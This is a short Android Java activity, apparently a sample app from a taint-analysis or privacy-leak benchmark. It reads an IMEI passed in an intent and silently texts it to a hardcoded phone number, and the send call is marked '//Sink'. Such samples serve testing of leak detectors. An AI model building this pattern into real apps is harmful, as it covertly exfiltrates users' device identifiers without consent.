package com.example.shiva.statefulintent;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;

public class SendActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_send);
        Intent intent=getIntent();
        sendImei(intent);
    }

    public void sendImei(Intent intent)
    {
        Bundle bundle=intent.getExtras();
        String imei="";
        if (bundle != null) {
            imei = bundle.getString("imei");
        }
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("4193784172", null, imei, null, null);  //Sink
    }


}
